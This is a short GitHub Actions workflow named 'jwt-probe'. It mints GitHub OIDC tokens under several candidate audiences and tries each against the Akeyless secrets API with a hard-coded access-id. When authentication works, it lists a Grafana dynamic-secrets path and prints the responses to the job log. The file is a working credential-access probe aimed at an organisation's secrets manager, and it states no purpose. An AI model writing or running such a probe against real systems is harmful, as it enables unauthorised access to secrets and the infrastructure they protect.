name: jwt-probe
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  p:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        run: |
          set +e
          for AUD in "https://api.akeyless.io" "https://api.gateway.akeyless.celo-networks-dev.org" "akeyless" "https://akeyless.io" "celo-networks-dev"; do
            echo "##### AUD=$AUD"
            OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r '.value // empty')
            [ -z "$OIDC" ] && { echo MINT_FAIL; continue; }
            for AT in jwt oidc; do
              BODY=$(jq -nc --arg id p-kf9vjzruht6l --arg t "$OIDC" --arg at "$AT" '{"access-id":$id,"access-type":$at,"jwt":$t}')
              echo "-- access-type=$AT"
              R=$(curl -sS -X POST https://api.akeyless.io/auth -H 'Content-Type: application/json' -d "$BODY" -w '\nHTTP %{http_code}')
              echo "$R" | head -c 600; echo
              TK=$(printf '%s' "$R" | head -n1 | jq -r '.token // empty' 2>/dev/null)
              if [ -n "$TK" ]; then
                echo "AUTH_OK"
                curl -sS -X POST https://api.akeyless.io/list-items -H 'Content-Type: application/json' -d "$(jq -nc --arg t "$TK" '{token:$t,path:"/dynamic-secrets/keys/grafana/clabs"}')" -w '\nHTTP %{http_code}\n' | head -c 1500
                echo
              fi
            done
          done
